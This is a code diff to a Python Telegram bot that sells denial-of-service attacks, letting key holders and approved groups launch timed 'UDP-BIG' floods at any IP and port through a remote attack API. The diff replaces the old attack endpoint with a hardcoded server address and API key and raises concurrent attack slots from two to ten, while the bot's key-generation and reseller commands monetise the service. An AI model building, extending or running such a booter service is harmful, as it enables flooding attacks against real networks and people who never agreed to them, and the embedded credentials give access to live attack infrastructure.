@@ -32,16 +32,16 @@ try:
     users_collection = db['users']
     resellers_collection = db['resellers']
     attack_logs_collection = db['attack_logs']
-    
+
     bot_users_collection = db['bot_users']
     bot_settings_collection = db['bot_settings']
     groups_collection = db['groups']
-    
+
     keys_collection.create_index('key', unique=True)
     users_collection.create_index('user_id', unique=True)
     resellers_collection.create_index('user_id', unique=True)
     bot_users_collection.create_index('user_id', unique=True)
-    
+
     print("MongoDB connected successfully!", flush=True)
 except Exception as e:
     print(f"MongoDB connection error: {e}", flush=True)
@@ -49,11 +49,10 @@ except Exception as e:
 
 bot = telebot.TeleBot(BOT_TOKEN)
 
-# ===== API LIST - 2 SLOTS (NEW API) =====
-API_LIST = [
-    "http://mahakalddos.duckdns.org/mahakal.php?key=@mahakal1814&ip={ip}&port={port}&time={duration}",
-    "http://mahakalddos.duckdns.org/mahakal.php?key=@mahakal1814&ip={ip}&port={port}&time={duration}",
-]
+# ===== API LIST - 10 SLOTS (NEW API) =====
+API_KEY = "qpMZA6JPG7ZDx4gC9cPoO3uO6YLlaOWq"
+API_BASE_URL = "http://13.232.68.73:3938/attack?ip={ip}&port={port}&time={duration}&key=" + API_KEY + "&slots={slot}"
+API_LIST = [API_BASE_URL.replace("{slot}", str(i)) for i in range(1, 11)]  # 10 slots
 
 # ===== REQUIRED CHANNELS =====
 REQUIRED_CHANNELS = [
@@ -84,7 +83,7 @@ DEFAULT_PRIVATE_MAX_ATTACK_TIME = 300
 DEFAULT_GROUP_MAX_ATTACK_TIME = 60
 DEFAULT_PRIVATE_COOLDOWN = 30
 DEFAULT_GROUP_COOLDOWN = 120
-DEFAULT_CONCURRENT_LIMIT = 2  # Updated to match new slot count
+DEFAULT_CONCURRENT_LIMIT = 10  # Updated to match new slot count
 
 # ===== SETTINGS FUNCTIONS =====
 def get_setting(key, default):
@@ -288,7 +287,7 @@ class DDOSProtection:
         self.global_reset = time.time()
         self.attack_history = defaultdict(list)
         self.enabled = True
-        
+
     def is_ddos_attack(self, user_id, chat_id):
         if not self.enabled:
             return False
@@ -361,7 +360,7 @@ def check_channel_join(message):
             not_joined.append(f"@{channel_username}")
     if not_joined:
         channels_text = "\n".join([f"• {ch}" for ch in not_joined])
-        bot.reply_to(message, 
+        bot.reply_to(message,
             f"❌ 𝗣𝗟𝗘𝗔𝗦𝗘 𝗝𝗢𝗜𝗡 𝗥𝗘𝗤𝗨𝗜𝗥𝗘𝗗 𝗖𝗛𝗔𝗡𝗡𝗘𝗟!\n\n"
             f"Attack karne se pehle ye channel join karo:\n\n{channels_text}\n\n"
             f"Join karne ke baad /verify use karke confirm karo.\n"
@@ -379,7 +378,7 @@ def check_group_approval(message):
         return True
     if is_group_approved(chat_id):
         return True
-    bot.reply_to(message, 
+    bot.reply_to(message,
         f"❌ 𝗚𝗥𝗢𝗨𝗣 𝗡𝗢𝗧 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗!\n\n"
         f"This group is not approved for attacks.\n\n"
         f"📢 Group ID: `{chat_id}`\n\n"
@@ -551,7 +550,7 @@ def user_has_active_attack(user_id):
         return False
 
 def get_max_concurrent():
-    return len(API_LIST)  # 2 slots
+    return len(API_LIST)  # 10 slots
 
 def get_free_api_index():
     with _attack_lock:
@@ -693,7 +692,7 @@ def start_attack(target, port, duration, message, attack_id, api_index, is_group
         cooldown_time = get_group_cooldown() if is_group else get_private_cooldown()
         method = "UDP-BIG"
         attack_start_msg = generate_attack_start_ui(target, port, duration, user_id)
-        
+
         # ===== SEND REEL WITH ATTACK MESSAGE =====
         try:
             if get_reel_enabled():
@@ -721,7 +720,7 @@ def start_attack(target, port, duration, message, attack_id, api_index, is_group
                 bot.reply_to(message, f"👑 Owner\n{attack_start_msg}")
             else:
                 bot.reply_to(message, attack_start_msg)
-        
+
         api_url = API_LIST[api_index].format(ip=target, port=port, duration=duration)
         try:
             t = threading.Thread(target=_call_single_api, args=(api_index, api_url, target, port, duration))
@@ -875,7 +874,7 @@ def ping_command(message):
     reel_count = len(get_reel_list())
     reel_status = "✅ ON" if get_reel_enabled() else "❌ OFF"
     feedback_status = "✅ ON" if get_feedback_enabled() else "❌ OFF"
-    response = f"🏓 Pong!\n\n• Response: {response_time}ms\n• Status: 🟢 Online\n• Users: {total_users}\n• Maintenance: {maintenance_status}\n• Channel: {channel_status}\n• DDoS: {ddos_status}\n• Groups: {approved_count}\n• Uptime: {uptime_str}\n• Reels: {reel_count} ({reel_status})\n• Feedback: {feedback_status}\n• Max Slots: 2\n\n⚡ Private: Max {get_private_max_attack_time()}s | Cooldown {get_private_cooldown()}s\n⚡ Groups: Max {get_group_max_attack_time()}s | Cooldown {get_group_cooldown()}s"
+    response = f"🏓 Pong!\n\n• Response: {response_time}ms\n• Status: 🟢 Online\n• Users: {total_users}\n• Maintenance: {maintenance_status}\n• Channel: {channel_status}\n• DDoS: {ddos_status}\n• Groups: {approved_count}\n• Uptime: {uptime_str}\n• Reels: {reel_count} ({reel_status})\n• Feedback: {feedback_status}\n• Max Slots: 10\n\n⚡ Private: Max {get_private_max_attack_time()}s | Cooldown {get_private_cooldown()}s\n⚡ Groups: Max {get_group_max_attack_time()}s | Cooldown {get_group_cooldown()}s"
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=["gen"])
@@ -884,7 +883,7 @@ def generate_key_command(message):
     if check_banned(message): return
     user_id = message.from_user.id
     reseller = get_reseller(user_id)
-    
+
     if is_owner(user_id):
         command_parts = message.text.split()
         if len(command_parts) != 3:
@@ -925,7 +924,7 @@ def generate_key_command(message):
         else:
             keys_text = "\n".join([f"• <code>{k}</code>" for k in generated_keys])
             bot.reply_to(message, f"✅ {count} Keys Generated!\n\n🔑 Keys:\n{keys_text}\n\n⏰ Duration: {duration_label}", parse_mode="HTML")
-    
+
     elif reseller:
         if reseller.get('blocked'):
             bot.reply_to(message, "🚫 Aapka panel blocked hai!")
@@ -1303,7 +1302,7 @@ def add_group_command(message):
         bot.reply_to(message, "❌ Invalid group ID!")
         return
     if add_approved_group(group_id):
-        bot.reply_to(message, f"✅ Group Approved!\n\n📢 Group ID: `{group_id}`\n\nNow all members can attack in this group without key!\n⚡ Max Time: {get_group_max_attack_time()}s\n⏳ Cooldown: {get_group_cooldown()}s\n🛡️ DDoS: {'ON' if get_ddos_protection() else 'OFF'}\n📢 Channel: {'✅ Required' if get_channel_required() else '❌ Not Required'}\n🔢 Max Slots: 2", parse_mode="Markdown")
+        bot.reply_to(message, f"✅ Group Approved!\n\n📢 Group ID: `{group_id}`\n\nNow all members can attack in this group without key!\n⚡ Max Time: {get_group_max_attack_time()}s\n⏳ Cooldown: {get_group_cooldown()}s\n🛡️ DDoS: {'ON' if get_ddos_protection() else 'OFF'}\n📢 Channel: {'✅ Required' if get_channel_required() else '❌ Not Required'}\n🔢 Max Slots: 10", parse_mode="Markdown")
     else:
         bot.reply_to(message, f"ℹ️ Group `{group_id}` already approved!", parse_mode="Markdown")
 
@@ -1363,7 +1362,7 @@ def groups_command(message):
         return
     approved = get_approved_groups()
     response = "═══════════════════════════\n📢 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 𝗚𝗥𝗢𝗨𝗣𝗦\n═══════════════════════════\n\n"
-    response += f"⚡ Max Time: {get_group_max_attack_time()}s\n⏳ Cooldown: {get_group_cooldown()}s\n🛡️ DDoS: {'ON' if get_ddos_protection() else 'OFF'}\n📢 Channel: {'✅ Required' if get_channel_required() else '❌ Not Required'}\n🔑 Key Required: ❌ NO\n🔢 Max Slots: 2\n\n"
+    response += f"⚡ Max Time: {get_group_max_attack_time()}s\n⏳ Cooldown: {get_group_cooldown()}s\n🛡️ DDoS: {'ON' if get_ddos_protection() else 'OFF'}\n📢 Channel: {'✅ Required' if get_channel_required() else '❌ Not Required'}\n🔑 Key Required: ❌ NO\n🔢 Max Slots: 10\n\n"
     if approved:
         response += f"📊 Total: {len(approved)}\n\n"
         for i, gid in enumerate(approved, 1):
@@ -1466,7 +1465,7 @@ def settings_command(message):
     response = "═══════════════════════════════════════\n⚙️ 𝗕𝗢𝗧 𝗦𝗘𝗧𝗧𝗜𝗡𝗚𝗦\n═══════════════════════════════════════\n\n"
     response += f"📱 𝗣𝗥𝗜𝗩𝗔𝗧𝗘\n• Max Time: {get_private_max_attack_time()}s\n• Cooldown: {get_private_cooldown()}s\n• Key: ✅ YES\n• DDoS: {'✅ ON' if get_ddos_protection() else '❌ OFF'}\n• Channel: {'✅ Required' if get_channel_required() else '❌ Not Required'}\n\n"
     response += f"👥 𝗚𝗥𝗢𝗨𝗣\n• Max Time: {get_group_max_attack_time()}s\n• Cooldown: {get_group_cooldown()}s\n• Key: ❌ NO\n• DDoS: {'✅ ON' if get_ddos_protection() else '❌ OFF'}\n• Channel: {'✅ Required' if get_channel_required() else '❌ Not Required'}\n• Groups: {len(get_approved_groups())}\n\n"
-    response += f"⚡ 𝗦𝗟𝗢𝗧𝗦\n• Max Concurrent Attacks: 2\n\n"
+    response += f"⚡ 𝗦𝗟𝗢𝗧𝗦\n• Max Concurrent Attacks: 10\n\n"
     response += f"📢 𝗖𝗛𝗔𝗡𝗡𝗘𝗟\n• @DESTROYDDOSLODER\n• Status: {'REQUIRED' if get_channel_required() else 'NOT REQUIRED'}\n• Toggle: /required_on /required_off\n\n"
     response += f"🎬 𝗥𝗘𝗘𝗟 𝗙𝗘𝗔𝗧𝗨𝗥𝗘\n• Status: {'ON' if get_reel_enabled() else 'OFF'}\n• Total Reels: {len(get_reel_list())}\n• Commands: /reel_on, /reel_off, /addreel, /removereel, /listreels\n\n"
     response += f"📸 𝗙𝗘𝗘𝗗𝗕𝗔𝗖𝗞\n• Status: {'ON' if get_feedback_enabled() else 'OFF'}\n• Toggle: /feedback_on /feedback_off\n\n"
@@ -2231,7 +2230,7 @@ def handle_attack(message):
     user_id = message.from_user.id
     chat_id = message.chat.id
     is_group = message.chat.type not in ['private', 'personal']
-    
+
     if is_group:
         if not check_group_approval(message):
             return
@@ -2243,13 +2242,13 @@ def handle_attack(message):
             else:
                 bot.reply_to(message, "❌ Tumhare paas valid key nahi hai!\n🔑 Key kharidne ke liye reseller se contact karo.")
             return
-    
+
     if protection.is_ddos_attack(user_id, message.chat.id):
         bot.reply_to(message, "🚫 DDoS Protection: Too many requests! Wait 5 seconds.")
         return
     if not check_channel_join(message):
         return
-    
+
     # Only check pending feedback if feedback is enabled
     if get_feedback_enabled() and not is_owner(user_id):
         fb = get_pending_feedback(user_id)
@@ -2263,19 +2262,19 @@ def handle_attack(message):
         if user_has_active_attack(user_id):
             bot.reply_to(message, "❌ Tumhara pehle se ek attack chal raha hai!")
             return
-    
+
     active_count = get_active_attack_count()
-    max_concurrent = len(API_LIST)  # 2 slots
+    max_concurrent = len(API_LIST)  # 10 slots
     if active_count >= max_concurrent:
         bot.reply_to(message, f"❌ Abhi chudai lgi hui hai! ({active_count}/{max_concurrent})\n\n/status se check kro")
         return
-    
+
     command_parts = message.text.split()
     if len(command_parts) != 4:
         # SIMPLIFIED USAGE MESSAGE
         bot.reply_to(message, "⚠️ Usage: /attack <ip> <port> <time>")
         return
-    
+
     target, port, duration = command_parts[1], command_parts[2], command_parts[3]
     if not validate_target(target):
         bot.reply_to(message, "❌ Invalid IP!")
@@ -2344,7 +2343,7 @@ def show_help(message):
 📊 MONITOR: /live, /logs, /del_logs
 🔧 MAINTENANCE: /maintenance, /ok
 
-🔢 Max Concurrent Attacks: 2
+🔢 Max Concurrent Attacks: 10
 '''
     elif is_reseller(user_id):
         help_text = '''
@@ -2354,7 +2353,7 @@ def show_help(message):
 💰 BALANCE: /mysaldo, /prices
 🔑 KEY GEN: /gen <duration> <count>
 ⚡ ATTACK: /redeem, /attack, /status, /mykey
-🔢 Max Concurrent Attacks: 2
+🔢 Max Concurrent Attacks: 10
 '''
     else:
         # ===== SIMPLIFIED USER HELP =====
@@ -2783,7 +2782,7 @@ def welcome_start(message):
 🛡️ DDoS: {'ON' if get_ddos_protection() else 'OFF'}
 📢 Channel: {'✅ REQUIRED' if get_channel_required() else '❌ NOT REQUIRED'}
 📢 Groups: {len(get_approved_groups())}
-🔢 Max Slots: 2
+🔢 Max Slots: 10
 🎬 Reel Feature: {'ON' if get_reel_enabled() else 'OFF'} ({len(get_reel_list())} reels)
 📸 Feedback: {'ON' if get_feedback_enabled() else 'OFF'}
 
@@ -2798,7 +2797,7 @@ Use /settings for settings.
         response = f'''💼 Welcome Reseller, {user_name}!
 
 Use /help to see commands.
-🔢 Max Slots: 2'''
+🔢 Max Slots: 10'''
     else:
         # ===== SIMPLIFIED USER START MESSAGE =====
         response = f'''🚀 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗕𝗼𝘁
@@ -2888,9 +2887,9 @@ def load_saved_channels():
 load_saved_channels()
 protection.enabled = get_ddos_protection()
 
-print("🔥 OGGY BHAI BOT STARTING...")
-print(f"🌐 API: http://mahakalddos.duckdns.org/mahakal.php")
-print(f"🔑 API Key: @mahakal1814")
+print("🔥 BOT STARTING...")
+print(f"🌐 API: http://13.232.68.73:3938/attack")
+print(f"🔑 API Key: {API_KEY}")
 print(f"🛡️ DDoS Protection: {'ON' if get_ddos_protection() else 'OFF'}")
 print(f"📢 Channel Required: {'REQUIRED' if get_channel_required() else 'NOT REQUIRED'}")
 print(f"📢 Approved Groups: {len(get_approved_groups())}")
@@ -2898,7 +2897,7 @@ print(f"⚡ Private Max Time: {get_private_max_attack_time()}s")
 print(f"⚡ Group Max Time: {get_group_max_attack_time()}s")
 print(f"⏳ Private Cooldown: {get_private_cooldown()}s")
 print(f"⏳ Group Cooldown: {get_group_cooldown()}s")
-print(f"🔢 Max Concurrent Slots: 2")
+print(f"🔢 Max Concurrent Slots: {len(API_LIST)}")
 print(f"🎬 Reel Feature: {'ON' if get_reel_enabled() else 'OFF'} ({len(get_reel_list())} reels)")
 print(f"📸 Feedback Feature: {'ON' if get_feedback_enabled() else 'OFF'}")
 print("=" * 50)
